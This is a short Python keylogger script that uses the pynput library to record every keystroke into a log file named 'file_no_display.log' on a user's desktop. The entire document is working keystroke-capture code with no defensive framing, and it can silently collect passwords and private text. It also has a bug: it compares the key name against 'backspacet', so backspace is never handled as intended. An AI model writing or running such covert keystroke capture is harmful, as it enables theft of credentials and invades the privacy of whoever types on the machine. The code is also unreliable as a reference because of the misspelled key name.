from pynput.keyboard import Key, Listener
import logging

log_file='/home/bertrand/Desktop/file_no_display.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
message = ""

def on_press(key):
    global message
    if (hasattr(key, 'name')):
        if key.name == 'space':
            message += " "
        elif key.name == 'enter':
            #if key pressed is enter
            logging.info(message)
            message = ""
        elif key.name == 'backspacet':
            message = message[:-1]
        else:
            #TODO : handle ctrl and alt
            logging.info(message)
            logging.info(key.name)
            message = ""
    else:
        message += key.char

with Listener(on_press=on_press) as listener:
    listener.join()